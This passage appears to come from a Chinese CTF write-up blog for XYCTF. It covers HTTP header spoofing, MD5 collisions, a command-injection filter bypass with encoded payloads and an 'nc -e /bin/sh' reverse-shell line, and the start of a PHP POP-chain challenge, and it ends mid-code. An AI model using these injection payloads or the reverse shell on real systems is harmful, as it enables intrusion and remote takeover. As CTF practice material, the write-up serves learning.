Q5tavQscz9H/8cHDXcxn1DY/XFcv264+G8IP49p8Jnnj3iU14/P6Y/pyE9/SOd3hLjAbQfPyT+XHb0jvpg9gyPXqqavcy9wGORwkxR6NOyf02scloTVJv7L/FUAesbHLnrK3G73z19S90EAACA6UuJRAQlNjEj9EkSX+z9qalxLv7ZPjoyMiD/Y/XEEfrEdPnPP3Q4Zv57uVZHKRD6dA+N6P2ohgcjdw5rPu5xu0s+6XqYbj4SoU/cCH0U7d7XS967PDIW6OYjKC80sA59mnJlSeZ9+zuV23hopK7csczt2FmX+J5T4phbfvq+1mHTaNaB4XPyAGb+KfDtmo7sE3++fs7iwRxsPbVMHOqmGnMdtKkJfa4VLYnz0UtAe9XmJ+P8xegfbTu1z+3+++kvTZsAAAAwXSmRiKDEJmaEPkmiee+yeBvnQkdLw/Gi1/bEM9X3dAl97l2tKSl0u93v1lxVNonWbMPf/21fznjeev9W4qHP8KVCOZRrxrI9jaHQp3dE62I1NmQeWBfQdvrvbveekzejp0JxIvSJG6FPhP5rJ9/c4usKd/MRlBeG3WuwCn2ufrR0mdux/AOfqSjVYOupF8SmXx7/TF8T/55To2aXDH08t9T1Qv9nWur0X6f0KOfK+zL02fzZkHGfgBavDH2WV5p/NhvF6WlQVz6MztsXDv7m+zMS+EmPR8f1moKXviF+ruL8xRgc/qKqyO1+7xNlPQAAAKYvJRIRlNjEjNBH0+Lb92r6978dmCr9+y/9qsBzZM+WXaH/fN3RVFNZcaTSszM36xfPz/1GsHf9jbqiXz2jveqJH/3qkHlqmCtHCtaF3/aZ1W8cvx65w7HX5KYoy/NF6nztx1+d8a2nn/7+D57W3zOuqb7jixUMU8V/Y94Lvyo4Zj1VvCD3fOE7T8g9HU/M/cmaLbsOHXzjzYPmKcYSpPWdkcuucqV1GmrTxsP4wngMjfTX/e678svM+HFu7i+10Efdx6zpw0K3+/Bnvb3K+gjj3VRS+OrcqPO89vJc2aKTt8q6XXVRJkWK/0rpHl/o89W10yfW/O7gDG229Xm//6Dgk2umfXRiz49+nX/wW5vknjNeO7Rmf12rabbpcOhz49M3/3hI3/mJzeW5/2xW9tR0tJ47nRN8zyc2v7dm/6fXokzvnYDOS5VvyF8Aefrl+f9FbtH+Q2+8cSg4HfhU/FAod7iu+9O3SsoujYyNDBtWhl6iunxiz7u1Xykru/95RMYlr566bgo3e9o/Theblh05rq+Jf8+p4ZWhj3vrWXW90H7qsHZsNU3an19UytDnpfetakt/8ZEsS7TsSI2y/l5vW+2+oqMXJmWC86Zdz8uraL1E/mJX5QRWa4s+ECzi/xF+skf/UvKXP7DKYokxgmzgq4/fdctqzsp6AAAATFtKJCIosYkZoc+93sZdaTO+s6aoplWf2KXzRt3B156R7a/fHA/u03psZ+6WrcKvn5Ub5L/dOxv2/PzHvy7ytYqW3sFfyH98R072dKHkF/McM57JOXJBb73rE4F/M31f8N/xkRLq6XN/oPFPP3A4Xo/nv/eOH/rcOP7qdxxzf7Hn1I0O+eftaxXi68/4fk6V9qfRbbHnjGdfq2wMTCrf0VRVsOY74qs//5eH/+/kN2tLZU+fktqbSpUc0Zo1TsQTfRkdSTz06R0YefCgv/Z3P5wpL6HD8dM/X4gjGjhfIY60/PNBdX1YHDeVpF+dI76Cnz398huBW6WjaX/mXMeMn+01teXiv1Jhjyf0uXfr+F8POjZX7mlo7hBt6Xtt105XPbNp//ffqVMP9d6VQ3866Nh0KOf05Q555js6vvBlbt7/RP5p5evroc8Z7wff/78f7NPftrOl9uB7M7IO5pxtM+4p3uTCB+VPZB1c8/651o4O7T0/zf39fnE8h74Qfxr3TIS/Kmeu4YkW5//YzjVzxTX9iewmpu0zFT8UoUzH4NrJN7NP3xkbM3TzEfT9I3V89cUnFZ69HzTdH1Y2tXvLtLik9mbkeqn/wmaZj+wr1rrdxb/nFLny3l5xAD8tj5ilS+P35Mg8KBTlDHyijfZyN0TuJp0qkuWHxKHuNR3q0P2mD/YUHfJebn2I28Oot2do+EtPHD/prR++Nk/eQbsMSXfDnp/M+LVFjC5rV4/WbhW7x903cODz98Uv1RGLswEAAIDpSYlEBCU2MSP0uV25ccaTv/vnSOQEv6NX3S84XigOtrsGBgaHh4aGh0dGT2/R/s19ad9L6Xsu9A7pLzv/xx/OnPlCUbgqRMdJ+U/5//nWuVHD245d/ssPHI4nc2tCu+lzUWuLX2shePyBP+UyNtIf3lMTmIhdvGX8U32PF/pc+MtPHDN+/WGnYar4sdHeE1lPOmasKYlseHy28xllUvkHY2Ojd6pfne347fGIPScgPMv4qNI6NTZrx2V8YXx69LN6bd+q/0e2yB0znt1aG6WXTVBH3XuyKXWhT1kfEtdNJWlXZ2ZKekFdx5CcYSiwdB5caYwSdAlcKYPHEfp0XKh4z7Gp8sOuyEM9e/TJrP1rjrcY9myrfeegI+vQf1/pN95UXxwpc2QdzG0I7SbJ0GfT/h8U+m73Dcn59fVl9PIbv93vKKoz7tnxSdW8rIObP+syPnxjQzf/tmO/43cfTbhDx4WCHzvS372j3P5fffhfTzpeD44YmoofCuUOF7rPFZZ4fP2R3XyE0NuGtJx4p9BT7rvRZ1GgqkkbCeUovGAxA2BfIMrR85H495wiQzdPPis+ZfXhY60R6xvLPMv/Szu2UOjT99mm5W7Hck9R5PH4/3n42U37tJ4+Focqf3z6bp59/93Ch57jPPw7ZvGTPjpk3HlQ/zmve/O7Dsd3/1A3LIekDY32f7x1YXZtv9wSnpwx8Msvlo9l6LP148BfchnTXmit74IW+jSq6wEAADBdKZGIoMQmZoQ+l/YsdfzwL9dC8/v29vbpze+633/39eBAgEHRaNOWMe0/tL6w4lc5J+6K1p/4V/lgz73Av/PD02w1FPxINNreqBP/IB8dGuq7L1b29faP+LbOFC381w2hT1hiNX1645/qO3boc33/mhmOZ3dfkw2Mwb6Bnnu9PT1Dok394FphqmngwLH/43BsPNYnJ5Xvl2u6RRNXnqk7B1e99PeoQwziJOcY1psw/eaePvEzvjBugdzn7pFXZOrjcMx4+rXjMXOfC7Knj+Uc2Lq4bipJuzq/LL8nto2N6LeKOKtDY1rTbrNxMEhCV8rgMYQ+t/65ZtP+ZytumQ71RuHv9jt+7w0f6uWPnsnaP7v0ivagBKfiHhg6WyLHZG0+G9xNI0Of39WcFy3lsdHA2/b2DY/c9vxhv+ONU+H3vHcud/N+x1uf3NU+Xjv/8j3l2b9x+tms/S//w5g6JeB4tsPxH+L2DzzR2peS9+zdQ6v+zRMYZDcVPxTKHT402Pbxnzd6W8S3U9Zb3vz3u9uufPTuniONplnV9fI31lHOvUCU885N+Wf8e06RgeGejwvlBF4z/vODY1e1ibruNFfs8nz7P09ePavV9HnVqw+I6xkau35030yxZvUhz7k2rdde26my0qcz3qu5qhVyXlZ+Wg3TxbtdqNiz94Nzt7q1Kzs54vlJ7x4cGn3QX7f1KYfjRzvl74m/KueF357qFj+DvcrPYIBXDxNN66MY75cKAAAA04wSiQhKbGJG6NPzSd6/OmavffezwJAlXf/AyNhw+D+0hmn/5v7XVz/qke24YAthUM72FO6Y89nO/yH2ebPuwciAFo4EDY70373bP2rZNksw9Bmv/05YzD1bS/63ONI/1I+ORHZaEW3k2tfFF10TKlYifVm6yuF49ndVrcYBUD29MjGRjWvDykmltGxjU14bt/uy/f7xVsf/98fClbLHz4yfGQdcKO5f/EA2pc5F7TMS902lXZ2tH4+NDkbMRT14St5mxngosStl8OhDn9bj5Y6sg3+4bHWo7+x3ZFUcag2suXDwkLbng9HBiMb20FD/3Z7+0cjRc9rwrn/6R4cGjVM49Xz5zh/E+trroTWfVM3I2r/xk/7RIdP03mOm1CkR7Qfk7Z93LKJTVV//0Jjag0MzeT8Uyh3ef/FvB3Z7O8dGlW4+QvgdguRdPTY6crGy0PORWubm3mm9Gs5p82xWSpQT/55TpX907EFv09HD/3O5+KyAF3bV3xge66yRU7aHh55pAe6dug9+JqcbC3g696NPO0fHLsop2x3LP/CZQp+bH3l2V14Uj6dM0iI3TVycP+ndMvb5eOt3HY5n3qqpzPrxbz/uHRs1FcwOSSz0uXla1vTxfqmuBwAAwHSlRCKCEpuYEfr0j3TX/fGnsjDxjG//eM2WXZWf6o26btF4iNaW21I7qjYpDVpL1op9Nlb1qBMM64O5wv+d3+jxhD61r890OF70NJv/0/fAqc3iS/zAbZyUZ2j02pF//4GsVfKNebIscc01vWBN//BYjNnNH5pozU7d7F0G3TJqeb32wYNrnnRxWmKNmbp7psTt3lujlOUOi/um0q/OKdO9ZGraJXalDB596FO7b78j64jHb3WoMvQpcwcGuLUcelv8efRY/6DSqUHveKU8fYFCzsoz1d2yV4Y+4Vm9Lrz/nviIwmaLG7JvsOdYkfzE4xMa4TU8eu399drt/83vvLxu575Tl/T6RIPy9jdVOJ68HwpjrDM02PlpccaxS7ITU+R6KfwOYVohmIGGw+7DamGXAX3eq2AJ5AhXa34q45JAp5j495wyA4GRsGNDnR1ffdna1qb3HRsbubBf9gCaWXgpGNb0BQdYjd3v6GhtbWvpHBRXSJzO7uiVieoPu8saBkaHhvR+eZMj7p/0vsHRB/212bPFzTAvzzc6NjocddxooqFP44dFbnfZZ6b1AAAAmK6USERQYhMzQh/ZDhcNhK/OHdyx+sf6rEgznk5/82BDa+/9iP/8rtP+zb31dPT/Ett971rxC9o+5jZY90BfrxyWoq4XHk/oc/K38vvGWELFSqR+rTXVe/PknuA8U45vPP/qruNXukWDL7zbZFNatrEpr02MuLibT8lxQFe0edz/zVxKOWD41sm9bvffa79U1gfFfVNFuzqmpl1iV8rg0Yc+J/fud2gzdkXzer2+57XiP4g/j50y18Pu6Rno61GSoEDoE7nSHPqcKBbveeQdv2XUoqdOR4qjpnWxaNHBg97rJ/76avq8b2on/Zs/ySmqunbvfr/5oZ68H4qIO/zm4QN/Pt4pB7gZVgYZ3iHS4IVy95Hzysq+L7XhTssrT0eul67WLBGbMk9d1aKc+PecSgMyXRNXILjI2erv36vIl315MmruGnro9PVro/nCizhdvX2flch4aHbxF+Yo//wR9/sX1OjtYSXwky4jraY/ftfhmLm2oiN6SiglFPo0f7TP7S755G70oj8AAACYZpRIRFBiEzNCH+0/tAZaCGNjg3fOH9mx9kcy0Xjipb0WA3zi+Dd3W5ksDWPRfSOWxxP6yETA8eLeL9T1QqC3RUSDvHtIXyuWsdHe6yeLs5fJRGPG0znHIsYxTS7Rmo1swkVbJjB716V9L31DHP+bp7Q/ZehzUhsHdM0j2+M5ETNtGQzqqc9Bn1ZexEqcN1XcoU+CVyrs0Yc+Mp3JOrL3lrpeiDxUf/mftNAnRr8GgzhDn8uyCPSRd6wHu3Wd+pv4xKNVd5X18RE3Rvj277lV89ffBm5/qwpQk/dDYYh17te/878+qB+y7OYjKC8M62sstyjsMvjFmz93O5bt85h7tGlztM8s/DyQj8S/55Tr7+sd7O8d1Msqdd9rekMeWMmhDnVuMlkdSd8zkB62Hdgm9iz8/UWLAVyNR9wVjTHiuQlJ6Ce9sfil5X/ct/W7jhnr3ov5W5pI6OP3/t3tLjnTESt5BAAAwPSiRCKCEpuYfe1Dn+tVlafEP7LvDw4OhacEejDW8dFvn3I4XjY3cuL4N/fQ2Tf+1eF4YU+0Wcxva1NTKx5P6NNSstzh+GHhlcDXNi+GITa3L7xXdU02pfqHDbNSjQ1eKV4+w/EvW2sNbzu5lJZtbMprx9G063lxOR2O54u0Qrx66CP+x8CILJQz+/e+0J6KgZG7vhK3+93TVtFGAjdV3KFPIlcqwqMPfVqOHZEDrG4EDsy8BA+1/9ODB2W/G6skS+qImIg9ztDn/qdVM7P2/9cnlnNvXyn+/X7H705fmUDdlvaGymPiJpHFy423/+jVv/1shuPJLabq7JP3QxG+vb+qfm9H+c0o3XyEyJcbnT9iEfr0j9QWym4yG4+r2aU+u/mmj/sCJyr+PR+xpuOpy9wzf3emfdzhpXc+/fdlbscvqupHLLq9yNAnPKXaJGkuTY/30bvwl2VpxeLZ1gZ5/ctvYlWR/3jLzPHuq6Cbp//udr/XMDDca9oEAACA6UqJRAQlNjH72oc+jbue33hEr80hyVmW9DmZ776f4XC8VhXeUxdHW25w+LScfeflva2mTULHe7/JrDD/t9zHE/oMX5LjmF74W2DuoUi3a4/VhM9M973jWT8uCBeOMbR+6//wr47n9ljU+5gcSss2NuW147jy938Tl3PmKxVfasPTQqGPfjkyKu6E9lT1j45cq9rjLq6+bNqUyE0Vd+iT0JUyevShz3DL6YVZ+184ek1Zr2mr/eRc8FB7R84fm5m1f6X1dFr+ysIPKjvCa+IMfYb6Pt/62/2z/37OsE/Q5ZPPZu1f+H6LUmE6PlWZ+vxKOjl1V2CO/bo3/9Xxomn2tMn7oQjd202HMirOyiq/oTUK48sjWYY+94ZGL1U9tcw9881PI1OGpv/7c7fj51X1o6ERT/HvOVX8Zz98KePdgsjLempXoWPZnjcvRdZUunp63cbiV49HFK6+XvF3xzJ3hvfuqFpASpqS0KdfFttSHr2Tu/Y0Gv7Ufbbz+X/765WxsdGR0Qf3j22c6ZiXE/Vx7r2uP6XGlZcOFVVZ7H/+/UL33pMtYyP9pk0AAACYtpRIRFBiE7Ovfehz9W8viH9jq6OTugeHvvQsc7y493rk+rjacr2DI/79y+U/3c2DnlqqctLfviinplY8ntBncLiv9vXvOuZZjE/pOPbay28Z+yD01PzWMdM8p1Vv/0jt1pkzX/c+ZKvv3tWakkK32/1uzVVlk9KyjU157TgGWt4Rp/0Fzxf6hEqh0Of63pWOma8e74lRC2NweKz3QnnhLqvOPvHfVHGHPolcqQiPPvQZHL5f+85Bx+tVx/U63wYdn1S9fLAp9OfQaNvB/97v2Gzes6P1n1U/L7tsrH8UZ+gzMDR69/T7M7PeK7j8lWE3wX+8SBzVsboBq74e4+o7+bpjRlqRep77B4ZPvz5z5uaTapQweT8UgXv7qxPvvbH38mjUbj5CxDtEsA59+oZGe7Wp0IvfCl+UXv/xQzP0fCQ8LCj+PcWDfLq0SDzIRYd9baGV1vwXjr4j9nS/e/yaId2zdqxAdjWaUWD4Fk3HfrTM/VThlf7IXKOpzCP2dPxnTXiusdZP1y13z3z145YHo4NW1cfGDX0S+FIhfZ9u/1fH7N+fMayszX2tUr3Va3Kf/t/v3R4T36FPm3rs7pFfznR8J1cfcGrWXvGKw/HLMkNvwet7cwrMj//1j95x7zl6ZTDGRGAAAACYhpRIRFBiE7Ovfegz4H1VNM5mPP3rgqoLLYGmV0dLQ2XOMzOf2lrXq8601XHkl2L3iH9zm/UMin+61277wQzxtkU11/RWeuftC8d2rvlR+t+vjo6ZS3V2/vP12Q7Hj946p6yP5vTrMQeGGMTec2DkwYNrB37+hGPuLwqONQTGnbXfqC361TM/33d5aMDQYOi+8rcXxXd/4oWthz69FNiz8/a1U7vWzJu5fH/rw0513HzcI9t/bveucqV1qrRsYzO+cHwDw2PX33/lqZnPvn7kgrhMoqH+n+9d+3Rv5tNPPLu9rj/2lGQ9A6MPepsq9rgP+L5SNsV/UzW89UOrq2NxmyVwpYwu7f+5wzF7U40pKjI7s1XeKcXmngiJEoc62nrgrf2OzZUFn1wOHGpHc+37lc+89fHlgfCh9g2NPuj+fMvW/TO2VO5puBb8UpePl1U+k//xlWHjNEb+I+79jt9+WKO0me9deut3+x2/qzmnv1aQcyH11B0om7HpUM7Jpla5vqOj5dyePx+asfnDY50jD0Izpiek5/I7sszTN57fsr/uSjCj8V+qLfrFUzOXH7w5rARJk/hDod/YX7y/8cjpuzG6+Qjhd1ZZhz7aPfzg9r5X3Y7VpZ6me933uq+fPfaz5e7/Udh0PzIfiX/P0IPsfuej5uBKa3WHA3u6Dwdqe0d35f19M5e5HTleLcq51+SteHa5e94bZ64/eDA6EJG4fXW28imx58/f10qbi+P8aM1q94z/qKrveRDtiR439EngS4VpvfNm/uwvDVo3nNvXDv7m13uvRPxOtl86tPE7jszqsbHhIT007xsae1Arfz3m/uaQ1QT5vQP3/7FppmPea5V6MfLrNQWv5Jy6O6g8/i0177j3VF4ZjBJyAQAAYNpSIhFBiU3MCH0+eePftr5z5P19Bb8KzkjleGLuT9a8UXal+8FYsH14XP4z3Gp5wTSsQzOkTfTzpbco56Wn9cmb5DTPr+6tuz00OjYS+Pe9dGmPbElaLIEqM5HiPoyob+twvBZZnFj+t+UHDzquHH5jzQvfkXOMy6+fnuPxaUca0ZpqObjxlf/e/+GhXbnBGakcM771/Zde2/Nxh2h4PfT4jpu1pbKnT0ntTaXThNKyjc34wjj0j4gLNdTy4Ru/eObbwa/009f2fXpHrLbI5iLJOXdG/d59bs+JyN5JE7mpQtdFuXah9Qlcqd5jr2nbLRb1vgpWNbJYXjWNbYyXdqijd6+cOrHm9wef0GbsemJzec4/LtweUA5VO//Dt70fVL285eCM8J6ftxn3vO593jD51/PvBweOfVIVWmlcr02zNdzRVJuTf/Bbm+SmJza/t2Z/XcugOIEx58OO5eaB/3hl54EPyoq2rnk2ePt/++mXX939SZt418Cgoan4oZA39v3TlXlFjYNjo0PqDW9kfOdINz76254Tl5WVkryHHzy4e/Kd0mdfll1pvrn63W1n2ofF3a/mI3HvedN3aI94kPcc+udX40yNf+fiP/bJIGXfPy6O29NnaHTEX3csY33hjGXy0+duLP2Dr23I6oIODI/dvXbm9c2FKdqe385499XKq+InSjx5UYLpayf27jkRM54zfKmWuOf7Fyfsrvf3K7VfgBnf/vGviz65Pxo+2ohbJTQ8UHlyzc9g//DY/c/f2fiMdrd8Y95LW4/fGh5Vcszrxz27PN7b8rakmw8AAIDNKJGIoMQmZl/70KdnSLa6ZINgcCgwz0v3QF+/Vq7Don0oGhRy5+HeiDa2WU+vPlGReNvARDPik4ZGxsZEw8PqP732DsrdI/KgWPq1Bpg2IkDdpBh/TzlZldxldKh/QBtO0tfbJ0s1h/7jc5A4fLGf2HFksE/fU3ypQa2FPTY8od4TRvqZlcuoMhGP0rKNzfjCePRpnys7UIjLJId31QS+UVztJS3duN/4/l+LDtf7w+vjvqn6Bke03dSrY32bxX2lwnr6tJfEk3Tc1+7YKPdnouI+VDm7tthRzrwWuKn6xYkSL1b37LH+Ij3azG7iwdFvyABxXeTa0eGBQbm+e6B/UJt4S7SOJ/zt9G+k3SoDPfq4s/4+8aW0jzelCZP4QyHu6lvHsg9U3RLf3nirmwXe08KgnG3OU910645pU7f+XI8NDwz03Ovv12eds7xh4tsz/CBHDVmCtB89bYlWhjws8LbiWRGnpXtgYEj7dKvbVXb1ksvokDyf4jj1ox4dtMxwO9oaqz279p68pXbqjJDAlzKQvfPkC+Ts+z09sgZU5JPe16vNByceEsPK4K/H6MhAYIaySHr4OzrcH/h2o4YgSWqrO/zXd0580SP3Gf+pBwAAwDSjRCKCEpuYfe1DH9HwGBsdGR4aMUzJI/6hLlqRQ4Z/MesNM4tFNE3Db6W4Pxgs9aovog0q/nUfuU+gJWleRPMgck8p7sOI+rayJRCxp6anN1hpWF+01rIpR9AaLcNiMcxIJfcdGeobp2Ubj0BMIL6KmoAoLdvYjC+Ml8wjtK/08VbH67XyGw2O11YP0Q57rPvzD94tbwiNMJrITRW6Lsq1i7xe8V2pXj1IsVrU+yrcmjUtozGbweOK81AFPQ8K7CYW056RBxn+CpFfM/KrdQ8OGp8+efK1AGjCRPtcPsHymkYe67DhoZ6KH4qhwVu+wj83DMrTotztitBLTAZGR7q/qDlYXOh2v1dn2to9KGOm0KfHOFFx7CmeCP0kiG9hebnDerTITLzRSDzxRL8MekKnKdYF7esfMN5Qyvk0kOPLCosP1nzR/WAk5k9HAl/KSJyu0HHIGM+YI0fcKqHbQ3lyLZ/BPsO3E98t4qv5Pz307vErXeI3aXLSWwAAACQZJRIRlNjEjNAHyU5p2camvDYxoULOCdF6FoyONxYMmBhxV8vEYWycbj6C8kKjoRHxDiPD/Xq/M4TcH9R6Ao3G338nycmfo2jdmgAAADDtKZGIoMQmZoQ+SHZKyzY25bWJGRqdYPcW0dAaGx1+qI4kgLWhweGxsfG7+QjKCyP09A7p/UMesgOXreiDahPp2ZfsemV/NBIfAAAA+1IiEUGJTcwIfYCgCYc+AAAAAABMMSUSEZTYxIzQBwAAAAAAINkpkYigxCZmhD4AAAAAAADJTolEBCU2MSP0AQAAAAAASHZKJCIosYkZoQ8AAAAAAECyUyIRQYlNzAh9AAAAAAAAkp0SiQhKbGJG6AMAAAAAAJDslEhEUGITM0IfAAAAAACAZKdEIoISm5gR+gAAAAAAACQ7JRIRlNjEjNAHAAAAAAAg2SmRiKDEJmaEPgAAAAAAAMlOiUQEJTYxI/QBAAAAAABIdkokIiixiRmhDwAAAAAAQLJTIhFBiU3MCH0AAAAAAACSnRKJCEpsYkboAwAAAAAAkOyUSERQYhMzQh8AAAAAAIBkp0QighKbmBH6AAAAAAAAJDslEhGU2MSM0AcAAAAAACDZKZGIoMQmZoQ+AAAAAAAAyU6JRAQlNjEj9AEAAAAAAEh2SiQiKLGJGaEPAAAAAABAslMiEUGJTcwIfQAAAAAAAJKdEokISmxiNp1CnxvNZ9WvZzoFAAAAAAAA9qNEIjeazyqxidn0Dn16ujqUUwAAAAAAAGAzPV0dSiRit9Cn5aYa+tzt8CtnAQAAAAAAwGbudviVSKTlpr1Cn9bWOuUb3mlvVs4CAAAAAACAzdxpb1YikdbWOiU2MZtOoc+dO5+p3/DW58pZAAAAAAAAsJnWW58rkcidO58psYnZdAp97t09r3xDoftuu3IiAAAAAAAAbKP7brsShgj37p5XYhOz6RT6COayPm3+K8q5AAAAAAAAsI02/xUlDImnoI8wzUKftrYG5XsKlHMGAAAAAAC2ZC7hLLS1NSiBiaVpFvp0dzUq31O4dfO8ckYAAAAAAABs4NZNq1o3XY1KYGJpmoU+QttttZyzcLv1knJSAAAAAAAAprXbrZeUAERouz1+CWfd9At9eu5fuNGsVvYRyH0AAAAAAIBtWCY+N5rP9txXo5Jopl/oI3R8ZVHZR7h18zz1fQAAAAAAwLR2t8NvOapL6Pgqrmo+umkZ+giWg7x0bf4rzOMOAAAAAACmne677ea5ukLiH9ilm66hj9DaWqd8eaPWW5/faW++2+Hv6epQziAAAAAAAECS6OnquNvhv9Pe3HrrcyXcMGptrVOCkXFN49BHiJ37AAAAAAAA2MAEEh9heoc+QoxxXgAAAAAAANNdoqO6QqZ96CN0fNVgOZ8XAAAAAADA9HWj+WxClZsVdgh9hJ77dPkBAAAAAAD20Xb7s/hnZ7dkk9BH193V2NbW0HKTXj8AAAAAAGBaarl5tq2toburUQk9JsBWoU/Ivbvn79z5rLW1TpypG82ScgYBAAAAAAAeOz21aLl5trW17s6dz+7dPa9EHA/DnqEPAAAAAADA1xyhDwAAAAAAgA0R+gAAAAAAANgQoQ8AAAAAAIANEfoAAAAAAADYEKEPAAAAAACADRH6AAAAAAAA2BChDwAAAAAAgA0R+gAAAAAAANgQoQ8AAAAAAIANEfoAAAAAAADYEKEPAAAAAACADRH6AAAAAAAA2BChDwAAAAAAgA0R+gAAAAAAANgQoQ8AAAAAAIANEfoAAAAAAADYEKEPAAAAAACADRH6AAAAAAAA2BChDwAAAAAAgA0R+gAAAAAAANgQoQ8AAAAAAIANEfoAAAAAAADYEKEPAAAAAACADRH6AAAAAAAA2BChDwAAAAAAgA0R+gAAAAAAANgQoQ8AAAAAAIANEfoAAAAAAADYEKEPAAAAAACADRH6AAAAAAAA2BChDwAAAAAAgA0R+gAAAAAAANgQoQ8AAAAAAIANEfoAAAAAAADYEKEPAAAAAACA7fRe+P8BdZrlSA/aMVsAAAAASUVORK5CYII=" alt="38ad9be863834e2b351b7dce2da4ed66.png"><br> 直接访问 &#x2F;flag 可以下载附件存在flag<br> （目录扫描)</p><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h3><p>爆破：<br>用户名：XYCTF<br> 密码：@JOILha!wuigqi123$</p><p>仿造http头<br> User-Agent: XYCTF<br> Referer: yuanshen.com<br> Client-IP:127.0.0.1<br> Connection: keep-alive<br> Via: ymzx.qq.com<br> Cookie: XYCTF</p><h3 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h3><p>网上直接找两张MD5值相同的图片提交，就可以得到flag</p><hr><h3 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h3><p><img src="/2024/05/18/XYCTF/Image(5).png" alt="c2a325ed4ac8abf222860d3e7efe1297.png"></p><p>绕过前面的 # : 使用换行符的url编码 %0a ，使后面 cmd GET传参的命令可以正常执行<br> 再使用 ; #闭合 注释掉后面 的 ,mamba out”  要不然总会报错</p><p>过滤了好多东西，又有长度限制，<br> 尝试了蛮久的，都不行，不晓得中间要写什么命令了</p><p>?cmd&#x3D;%0a ;%23</p><p>看完wp后，中间写上    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_GET[1]`   绕过长度限制</span><br></pre></td></tr></table></figure><p>这个长度为13是卡得正正好啊，写的时候用的 $_POST[1] ，长度超了，就放弃了，还真就没想到 $_GET[1]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23&amp;1=cp /flag 1.txt</span><br><span class="line">(将flag文件里面的内容复制到 1.txt里面去，直接访问1.txt 得到flag)</span><br><span class="line">（不能 cat /flag  转八进制，试了好久，不晓得为啥）</span><br><span class="line">转成八进制</span><br><span class="line">?cmd=%0a`$_GET[1]`;%23&amp;1=$&#x27;\143\160&#x27;+$&#x27;\57\146\154\141\147&#x27;+$&#x27;\61\56\164\170\164&#x27;</span><br><span class="line"> 然后直接访问1.txt ,拿到flag</span><br><span class="line"> </span><br><span class="line"> 这道题看其他人的wp, 是可以去反弹shell的</span><br><span class="line"> ?cmd=%0a`$_GET[1]`;%23&amp;1=nc ip 端口 -e /bi&#x27;&#x27;n/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="image-20240427213631321.png" alt="image-20240427213631321" style="zoom:50%;" /><p><img src="/2024/05/18/XYCTF/image-20240511180342334.png" alt="image-20240511180342334"></p><h3 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span 